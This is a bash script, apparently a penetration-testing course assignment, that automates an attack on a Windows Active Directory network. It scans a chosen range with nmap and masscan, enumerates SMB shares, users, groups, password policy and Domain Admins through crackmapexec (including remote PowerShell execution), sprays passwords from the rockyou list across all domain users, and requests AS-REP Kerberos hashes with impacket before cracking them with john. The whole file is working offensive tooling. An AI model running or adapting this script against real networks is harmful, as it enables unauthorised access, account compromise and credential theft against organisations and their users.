#!/bin/bash

### NET- network to scan 
# DNAME - domain name
# ADUSER - Active Directory user name
# ADPASS - Active Directory user password
# PASSLIST - password list 
# DIRPATH - full path to the chosen dir



function help_menu()
{
    echo "================ Help Menu ================"
    echo ""
    echo "Scanning Mode:"
    echo "1. Basic: 'nmap -Pn <target>' (Skip host discovery)."
    echo "2. Intermediate: 'nmap -p- <target> -Pn -sV --open' (Scan all open ports)."
    echo "3. Advanced: 'masscan -pU:1-65535  -iL <targets> --rate=1000' (Include UDP scanning)."
    echo ""
    echo "Enumeration Mode:"
    echo "1. Basic:"
    echo "- 'nmap -sV <target>' (Identify services)."
    echo "- Identify the IP Address of the Domain Controller."
    echo "- Identify the IP Address of the DHCP server."
    echo ""
    echo "2. Intermediate:"
    echo "- Enumerate IPs for FTP, SSH, SMB, WinRM, LDAP, RDP."
    echo "- 'smbmap' (Enumerate shared folders)."
    echo "- NSE scripts: 'os-discovery', 'vuln-ms17-010', 'ftp-anon'."
    echo ""
    echo "3. Advanced (if AD creds provided):"
    echo "- Extract users, groups and share folders (crackmapexec)."
    echo "- Display password policy."
    echo "- Find disabled/never-expired accounts, Domain Admins group members."
    echo ""
       echo "Exploitation Mode:"
    echo "1. Basic: Deploy the NSE vulnerability scanning script."
    echo "2. Intermediate: Execute domain-wide password spraying to identify weak credentials."
    echo "3. Advanced: Extract and attempt to crack Kerberos tickets using pre-supplied passwords (impacket)."
    echo ""
    echo "==========================================="
    echo ""

}

if [  "$1" == "-h"  ]  ||  [  "$1" == "--help"  ]
then
	help_menu
fi

#1 Prompt the user to enter the target network range for scanning.
#Make sure the input is valid.
function USER_INPUT () {
    while true; do
        read -p "[+] Please enter the network range you would like to scan in CIDR notation (your IP is $(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1)): " NET

# Validate the input
        if [[ ! "$NET" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$ ]] && [[ ! "$NET" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            echo "Error: Invalid input format. Please enter a valid IP address (e.g., 192.168.1.0/24) or a single IP address."
        else
            break  # Exit the loop if a valid input is provided
        fi
    done

# Check if it's a single IP or a network range
    if [[ "$NET" =~ / ]]; then
        echo "Scanning network range: $NET"

    else
        echo "Scanning single IP: $NET"

    fi
    
## 1.2. Ask for the Domain name and Active Directory (AD) credentials.
	read -p "[+] please enter Domain name: " DNAME
	read -p "[+] if given plz enter active domain username (if not leave empty): " ADUSER
	read -s -p "[+] if given plz enter active domain password (if not leave empty): " ADPASS
	echo ""
   
## 1.3. Prompt the user to choose a password list, defaulting to Rockyou if none is specified.
       read -e -p "[+] please provide a password list (leave blank to use default list): " PASSANS
    if [ "$PASSANS" == '' ];then
        echo "[+] Ok using default list: /usr/share/wordlists/rockyou.txt"
        PASSLIST='/usr/share/wordlists/rockyou.txt '
        sleep 1.5
    elif ! [ -f "$PASSANS" ];then
        echo " [/] file not found using defult file."
        sleep 1.5
        PASSLIST='/usr/share/wordlists/rockyou.txt '
    else 
        PASSLIST=$(echo "$PASSANS")
    fi
}

USER_INPUT


function MKDIR(){ 
    read -p "[+] Please provide a directory name to save all the results to: " DIR
    if [ -d "$DIR" ];then
        echo " [!] Directory already exists, please provide a diffrent name."
        sleep 1
        MKDIR
    elif [ "$DIR" == '' ];then
        echo " [!] Directory name cant be blank."
        sleep 1
        MKDIR
    else 
        mkdir "$DIR"
        echo "[+] Results will be saved to "$PWD"/"$DIR""
        sleep 1.5
    fi
    
    DIRPATH=$(echo ""$PWD"/"$DIR"")
}

MKDIR

## Scanning Functions
basic_scanning()
{
	echo "Performing Basic Scanning...";
	nmap $NET -Pn --open | tee $DIRPATH/Nmap_res
	cat $DIRPATH/Nmap_res | grep 'report for' | awk '{print $NF}' > $DIRPATH/Live_hosts  
	
}

##3.1.1. Identify services (-sV) running on open ports.
intermediate_scanning()
{ 
	
	echo "Performing Intermediate Scanning...";
	for i in $(cat $DIRPATH/Live_hosts); do nmap -p- $i -Pn -sV --open -oN $DIRPATH/Nmap_$i.txt;sleep 0.1 ;done
 

}

advanced_scanning()
{ 
	
	echo "Performing Advanced Scanning...";
	masscan -pU:1-65535  -iL $DIRPATH/Live_hosts --rate=1000 -oG $DIRPATH/udp_res
}


## Enumeration Functions
basic_enumeration()
{ 
##3.1.1. Identify services (-sV) running on open ports. already running on intermediate_scanning to save time
	echo "Performing Basic Enumeration...";	
	
	   echo "Checking for open LDAP ports..."
    for file in $DIRPATH/Nmap_*.txt; do
        echo "Checking file: $file"
        if grep -q 'ldap' "$file"; then
            echo "Open LDAP port found in file: $file"
           echo "$file" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' > $DIRPATH/Domain_ip
           echo "domain ip: $(cat $DIRPATH/Domain_ip)"

        else
            echo "No open LDAP port found in file: $file"
            
            

        fi
    done
    
        echo "Checking for open DNS ports..."
    
    for file in $DIRPATH/Nmap_*.txt; do
        echo "Checking file: $file"
        if grep -q 'DNS' "$file"; then
            echo "Open DNS port found in file: $file"
           echo "$file" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' > $DIRPATH/DNS_server_ip
           echo "DNS server ip: $(cat $DIRPATH/DNS_server_ip)"

        else
            echo "No open DNS port found in file: $file"
            
            

        fi
    done
	
		echo "Checking for open DHCP ports..."

	    for file in $DIRPATH/Nmap_*.txt; do
        echo "Checking file: $file"
        if grep -q 'dhcp' "$file"; then
            echo "Open DHCP port found in file: $file"
           echo "$file" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' > $DIRPATH/DHCP_server_ip
           echo "DHCP server ip: $(cat $DIRPATH/DHCP_server_ip)"

        else
            echo "No open DHCP port found in file: $file"
            
            

        fi
    done
}

intermediate_enumeration()
{ 
	echo "Performing Intermediate Enumeration...";
#Define the services to check for
services=("ftp" "ssh" "microsoft-ds" "ldap" "ms-wbt-server" "winrm")

for file in $DIRPATH/Nmap_*.txt; do
    echo "Checking file for key services: $file"
    if grep -qE 'ftp|ssh|microsoft-ds|ldap|ms-wbt-server|winrm' "$file"; then
        echo "Key service port found in IP:"
        grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' <<< "$file"
    else
        echo "No key service port found in IP:"
        grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' <<< "$file"
    fi
done

#3.2.2. Enumerate shared folders.
# 3.3.3. Extract all shares.
# Check if ADUSER and ADPASS are not empty if the user did not give credentials then try Anonymous login
if [ -n "$ADUSER" ] && [ -n "$ADPASS" ]; then
    echo "Enumerate shared folders:"
	for ip in $(cat "$DIRPATH/Domain_ip"); do smbmap -u $ADUSER -p $ADPASS -H "$ip" 2>/dev/null | tee $DIRPATH/share_folders ;done
else
    echo "attempting Anonymous login to share folder:"
	for ip in $(cat "$DIRPATH/Domain_ip"); do smbclient -N -L //"$ip" 2>/dev/null | tee $DIRPATH/anon_share_folder ;done
fi

# 3.2.3. Add three (3) NSE scripts you think can be relevant for enumerating domain networks.
	echo ""
	echo "nse scritps that can help enumerat the domain:"
	echo "os-discovery.nse - attempts to identify the operating system running on a target"
	echo "vuln-ms17-010.nse - checks if a remote host is vulnerable to the MS17-010 exploit"
	echo "ftp-anon.nse - checks for anonymous FTP login capabilities on a target"
	echo ""
}


advanced_enumeration()
{
	
TEMP_USERS=$(mktemp -t users_XXXX.lst)
TEMP_DISABLED_USERS=$(mktemp -t disabled_users_XXXX.lst)
TEMP_NEVER_EXPIRED_USERS=$(mktemp -t never_expired_users_XXXX.lst)

mkdir -p "$DIRPATH/groups_and_users" > /dev/null 2>&1

	# 3.3.1. Extract all users
	for i in $(cat $DIRPATH/Domain_ip); do crackmapexec smb $i -u $ADUSER -p $ADPASS --users >> $TEMP_USERS ; sleep 0.1 ; done
	echo "Users found in the domain:" ; if grep -q "STATUS_LOGON_FAILURE" $TEMP_USERS; then echo "Failed to extract users."; else cat $TEMP_USERS | grep -oP '\b[a-zA-Z0-9_.-]+\\[a-zA-Z0-9_.-]+' | awk -F '\\' '{print $2}' | tee $DIRPATH/groups_and_users/only_users.txt; fi
	echo ""

	# 3.3.2. Extract all groups
	for i in $(cat $DIRPATH/Domain_ip); do crackmapexec smb $i -u $ADUSER -p $ADPASS --groups >> $DIRPATH/groups_and_users/groups.txt ; sleep 0.1 ; done
	echo "Groups found in the domain:" ; if grep -q "STATUS_LOGON_FAILURE" $DIRPATH/groups_and_users/groups.txt; then echo "Failed to extract groups."; else echo "$DIRPATH/groups_and_users/groups.txt:"; fi
	echo ""

	# 3.3.4. Display password policy
	for i in $(cat $DIRPATH/Domain_ip); do crackmapexec smb $i -u $ADUSER -p $ADPASS --pass-pol >> $DIRPATH/groups_and_users/pass_policy.txt ; sleep 0.1 ; done
	echo "Password policy found:" ; if grep -q "STATUS_LOGON_FAILURE" $DIRPATH/groups_and_users/pass_policy.txt; then echo "Failed to retrieve password policy."; else echo "$(cat $DIRPATH/groups_and_users/pass_policy.txt | grep -A 20 'Dumping password info for domain' | grep -E 'Minimum password length|Password history length|Maximum password age|Password Complexity Flags|Minimum password age|Reset Account Lockout Counter|Locked Account Duration|Account Lockout Threshold|Forced Log off Time')"; fi
	echo ""

	# 3.3.5. Find disabled accounts
	for i in $(cat $DIRPATH/Domain_ip); do crackmapexec smb $i -u $ADUSER -p $ADPASS! -x "powershell -command \"Get-ADUser -Filter {Enabled -eq \$false} -Properties samAccountName | Select-Object samAccountName\"" >> $TEMP_DISABLED_USERS ; sleep 0.1 ; done
	echo "Disabled users found in the domain:" ; if grep -q "STATUS_LOGON_FAILURE" $TEMP_DISABLED_USERS; then echo "Failed to find disabled users."; else cat $TEMP_DISABLED_USERS | sed -n '/samAccountName/{n; n; p; :a; n; p; ba}' | awk '{print $NF}' | tee $DIRPATH/groups_and_users/only_disabled_users.txt; fi
	echo ""

	# 3.3.6. Find never-expired accounts
	for i in $(cat $DIRPATH/Domain_ip); do crackmapexec smb $i -u $ADUSER -p $ADPASS! -x "powershell -command \"Get-ADUser -Filter {PasswordNeverExpires -eq \$true} -Properties samAccountName | Select-Object samAccountName\"" >> $TEMP_NEVER_EXPIRED_USERS ; sleep 0.1 ; done
	echo "Never expired users found in the domain:" ; if grep -q "STATUS_LOGON_FAILURE" $TEMP_NEVER_EXPIRED_USERS; then echo "Failed to find never-expired users."; else cat $TEMP_NEVER_EXPIRED_USERS | sed -n '/samAccountName/{n; n; p; :a; n; p; ba}' | awk '{print $NF}' | tee $DIRPATH/groups_and_users/only_never_expired_users.txt; fi
	echo ""

	# 3.3.7. Display accounts that are members of the Domain Admins group
	for i in $(cat $DIRPATH/Domain_ip); do crackmapexec smb $i -u $ADUSER -p $ADPASS --groups "Administrators" >> $DIRPATH/groups_and_users/admin_group.txt ; sleep 0.1 ; done
	echo "Members of the Domain Admins group:" ; if grep -q "STATUS_LOGON_FAILURE" $DIRPATH/groups_and_users/admin_group.txt; then echo "Failed to retrieve Domain Admins group members."; else echo "$(cat $DIRPATH/groups_and_users/admin_group.txt | grep -oP '\b[a-zA-Z0-9_.-]+\\[a-zA-Z0-9_.-]+' | awk -F '\\' '{print $2}')"; fi
	echo ""

}

## Exploitation Functions


basic_exploitation()
{
	 echo "Performing Basic Exploitation...";
	 mkdir -p "$DIRPATH/nse_scripts" > /dev/null 2>&1
	 echo "runing nse scripts"
	for i in $(cat $DIRPATH/Live_hosts); do nmap -Pn -p 445 --script smb-os-discovery.nse $i | tee $DIRPATH/nse_scripts/os-discovery ;sleep 0.1 ;done

	for i in $(cat $DIRPATH/Live_hosts); do nmap -Pn -p 445 --script smb-vuln-ms17-010.nse $i | tee $DIRPATH/nse_scripts/vuln-ms17-010 ;sleep 0.1 ;done

	for i in $(cat $DIRPATH/Live_hosts); do nmap -Pn -p 21 --script ftp-anon.nse $i | tee $DIRPATH/nse_scripts/ftp-anon ;sleep 0.1 ;done
	 
	 
 }
 
 #4.2.Execute domain-wide password spraying to identify weak credentials.
intermediate_exploitation()
{ 
	echo "Performing Intermediate Exploitation...";
	mkdir -p "$DIRPATH/password_spraying" > /dev/null 2>&1

	for i in $(cat $DIRPATH/Domain_ip); do crackmapexec smb $i -u $DIRPATH/groups_and_users/only_users.txt -p $PASSLIST --continue-on-success  >> $DIRPATH/password_spraying/crack_users.txt ;sleep 0.1 ;done
	cat $DIRPATH/password_spraying/crack_users.txt | grep "[+]" | awk '{print $6}' | sed 's/:/ password: /g' | sed 's/\\/ user: /g' | tee $DIRPATH/password_spraying/only_crack_users.txt 

}

advanced_exploitation()
{
	
TEMP_KERB_USERS=$(mktemp -t kerb_users_XXXX.lst)

	echo "Performing Advanced Exploitation...";
	
	REQUIREMENTS=("impacket")

    for package_name in "${REQUIREMENTS[@]}"; do
        if ! pip show "$package_name" >/dev/null 2>&1; then
            echo -e "[*] Installing $package_name..."
            if pip install "$package_name" >/dev/null 2>&1; then
                echo "[#] $package_name installed."
            else
                echo "[!] Failed to install $package_name (try updating)."
            fi
        else
            echo "[#] $package_name is already installed."
        fi
    done

mkdir -p "$DIRPATH/kerb" > /dev/null 2>&1

python3 /home/kali/Desktop/impacket/examples/GetNPUsers.py $DNAME.local/ -usersfile $DIRPATH/groups_and_users/only_users.txt -dc-ip $(cat $DIRPATH/Domain_ip) -request | tee $TEMP_KERB_USERS | grep -F "$" | sed 's/\$/\n\$/g'


cat $TEMP_KERB_USERS | grep -F "$" | sed 's/\$krb5asrep/\n\$krb5asrep/g' | awk -v dirpath="$DIRPATH/kerb/" '/\$krb5asrep/ {counter++} {print > (dirpath "/ticket" counter ".txt")}'
 
for i in $(echo $DIRPATH/kerb/ticket*.txt); do john --format=krb5asrep --wordlist=$PASSLIST $i ;sleep 0.1 ;done >/dev/null 2>&1

echo ""
echo "Passwords managed to be cracked:"
john --show $DIRPATH/kerb/ticket*.txt | tee -a $DIRPATH/kerb/cracked_kerb.txt

}

# Get operation level from the user
# 1.4. Require the user to select a desired operation levelBasic, Intermediate, Advanced or None
echo "Choose the operation level for each mode before any actions are executed."

echo "1. Basic"
echo "2. Intermediate"
echo "3. Advanced"

read -p "Select operation level for Scanning Mode (1-3): " scanning_choice
read -p "Select operation level for Enumeration Mode (1-3): " enumeration_choice
read -p "Select operation level for Exploitation Mode (1-3): " exploitation_choice

# Execute Scanning 
case $scanning_choice in
    1) basic_scanning ;;
    2) basic_scanning
    intermediate_scanning ;;
    3) basic_scanning 
    intermediate_scanning
	advanced_scanning ;;
    *) echo "Invalid Scanning choice. Exiting."; exit 1 ;;
esac

# Execute Enumeration
case $enumeration_choice in
    1) basic_enumeration ;;
    2) basic_enumeration
    intermediate_enumeration ;;
    3) basic_enumeration
    intermediate_enumeration
    advanced_enumeration ;;
    *) echo "Invalid Enumeration choice. continue without Enumeration." ;;
esac

# Execute Exploitation
case $exploitation_choice in
    1) basic_exploitation ;;
    2) basic_exploitation 
    intermediate_exploitation ;;
    3) basic_exploitation
    intermediate_exploitation
    advanced_exploitation ;;
    *) echo "Invalid Exploitation choice.continue without Exploitation." ;;
esac



#5.1. For every execution, save the output in a PDF file.
#make shure the user have enscript tool
PDF_REQUIREMENTS=("enscript")

for package_name in "${PDF_REQUIREMENTS[@]}"; do
    if ! dpkg -l | grep -q "$package_name"; then
        echo -e "[*] Installing $package_name..."
        if sudo apt-get install -y "$package_name" >/dev/null 2>&1; then
            echo "[#] $package_name installed."
        else
            echo "[!] Failed to install $package_name (try updating)."
        fi
    else
        echo "[#] $package_name is already installed."
    fi
done

echo "making a PDF file of the script outpot"

TEMP_OUTPUT=$(mktemp -t output_XXXX.lst)
TEMP_ENSCRIPT_OUTPUT=$(mktemp -t output_enscript_XXXX.lst)

cat $DIRPATH/Nmap_res > $TEMP_OUTPUT >/dev/null 2>&1
cat $DIRPATH/udp_res >> $TEMP_OUTPUT >/dev/null 2>&1
cat $DIRPATH/share_folders >> $TEMP_OUTPUT /dev/null 2>&1
cat $DIRPATH/groups_and_users/* >> $TEMP_OUTPUT >/dev/null 2>&1
cat $DIRPATH/kerb/cracked_kerb.txt >> $TEMP_OUTPUT >/dev/null 2>&1
cat $DIRPATH/nse_scripts/* >> $TEMP_OUTPUT /dev/null 2>&1
cat $DIRPATH/password_spraying/only_crack_users.txt >> $TEMP_OUTPUT >/dev/null 2>&1

enscript $TEMP_OUTPUT -p $TEMP_ENSCRIPT_OUTPUT >/dev/null 2>&1

ps2pdf $TEMP_ENSCRIPT_OUTPUT $DIRPATH/output.pdf >/dev/null 2>&1





